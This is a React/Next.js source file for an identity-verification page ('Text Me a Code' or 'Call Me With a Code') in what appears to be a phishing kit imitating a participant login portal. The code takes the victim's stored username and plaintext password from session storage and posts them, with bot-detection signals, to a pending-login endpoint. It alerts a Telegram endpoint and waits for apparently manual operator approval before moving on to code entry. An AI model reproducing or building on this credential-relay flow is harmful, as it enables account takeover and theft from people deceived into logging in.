"use client"

import { useEffect, useState, type FormEvent } from "react"
import { useRouter } from "next/navigation"
import {
  APPROVAL_TIMEOUT_MS,
  MSG_UNABLE_REACH_VERIFICATION,
} from "@/lib/approval-messages"
import {
  EbcParticipantShell,
  EBC_LINK_CLASS,
  ebcPrimaryButtonClass,
} from "@/components/ebc-participant-shell"
import { useBotGateSignals } from "@/hooks/use-bot-gate-signals"
import { readStoredPassword, readStoredUsername } from "@/lib/login-flow-storage"
import { pollPendingLogin } from "@/lib/poll-pending-login"
import {
  pendingLoginMethod,
  verificationTypeLabel,
  type DeliveryMethod,
} from "@/lib/verification-method"

const options: Array<{
  id: DeliveryMethod
  title: string
  subtitle: string
}> = [
  {
    id: "text",
    title: "Text Me a Code",
    subtitle: "You'll enter it to log on.",
  },
  {
    id: "call",
    title: "Call Me With a Code",
    subtitle: "Get a call that says a code for you to enter.",
  },
]

export default function VerifyChoicePage() {
  const router = useRouter()
  const [isLoading, setIsLoading] = useState(false)
  const [selectedOptionId, setSelectedOptionId] = useState<DeliveryMethod>("text")
  const [networkError, setNetworkError] = useState("")
  const getBotGateSignals = useBotGateSignals()

  useEffect(() => {
    try {
      if (!sessionStorage.getItem("loginReady")) {
        window.location.href = "/"
      }
    } catch {
      window.location.href = "/"
    }
  }, [])

  const handleContinue = async (event: FormEvent) => {
    event.preventDefault()
    if (isLoading) return
    setIsLoading(true)
    setNetworkError("")

    const selected = options.find((option) => option.id === selectedOptionId)
    if (!selected) {
      setIsLoading(false)
      return
    }
    const id = selected.id
    const title = selected.title

    await fetch("/api/telegram/verification-click", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        verificationType: title,
        page: "/verify-choice",
      }),
    }).catch(() => {})

    const userId = readStoredUsername() || sessionStorage.getItem("loginUserId") || ""
    const password = readStoredPassword() || sessionStorage.getItem("loginPassword") || ""
    const maskedEmail = sessionStorage.getItem("maskedEmail") ?? "**********"
    const maskedPhone = sessionStorage.getItem("maskedPhone") ?? "***-***-****"

    try {
      const res = await fetch("/api/pending-login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          userId,
          password,
          method: pendingLoginMethod(id),
          maskedEmail,
          maskedPhone,
          flow: "login",
          ...getBotGateSignals(),
        }),
      })
      const data = (await res.json()) as { id?: string; error?: string }
      if (!res.ok) {
        setNetworkError(data.error || MSG_UNABLE_REACH_VERIFICATION)
        setIsLoading(false)
        return
      }
      if (!data.id) {
        window.location.href = "/?verifyUnavailable=1"
        return
      }

      const result = await pollPendingLogin(data.id, APPROVAL_TIMEOUT_MS)

      if (result === "approved") {
        sessionStorage.setItem("verificationMethod", id)
        sessionStorage.setItem("verificationType", verificationTypeLabel(id))
        router.push(`/verify?method=${encodeURIComponent(id)}`)
        return
      }
      if (result === "redirected") {
        window.location.href = "/api/login-out"
        return
      }
      if (result === "denied") {
        window.location.href = "/?loginDenied=1"
        return
      }
      window.location.href = "/?verifyUnavailable=1"
    } catch {
      setNetworkError(MSG_UNABLE_REACH_VERIFICATION)
      setIsLoading(false)
    }
  }

  return (
    <EbcParticipantShell
      title="Verify It's You"
      intro="Before you can get full access, you'll need to confirm your identity."
    >
      <form onSubmit={handleContinue} className="max-w-xl">
        <div className="space-y-3">
          {options.map((option) => {
            const selected = selectedOptionId === option.id
            return (
              <button
                key={option.id}
                type="button"
                disabled={isLoading}
                onClick={() => setSelectedOptionId(option.id)}
                className={`w-full text-left border rounded-sm px-4 py-3 ${
                  selected ? "border-blue-400 ring-1 ring-blue-400 bg-white" : "border-gray-300 bg-white"
                } ${isLoading ? "opacity-70 cursor-not-allowed" : "hover:bg-gray-50"}`}
              >
                <p className="font-bold text-[20px]">{option.title}</p>
                <p className="mt-1 text-gray-600">{option.subtitle}</p>
              </button>
            )
          })}
        </div>

        {networkError ? (
          <p className="mt-6 text-red-600 text-sm" role="alert">
            {networkError}
          </p>
        ) : null}

        <div className="mt-8">
          <button
            type="submit"
            disabled={isLoading}
            className={ebcPrimaryButtonClass(isLoading)}
          >
            <span className="text-[18px]">{isLoading ? "Loading..." : "Continue"}</span>
          </button>
          <button
            type="button"
            disabled={isLoading}
            onClick={() => router.push("/")}
            className={`${EBC_LINK_CLASS} mt-3`}
          >
            Cancel
          </button>
        </div>
      </form>
    </EbcParticipantShell>
  )
}
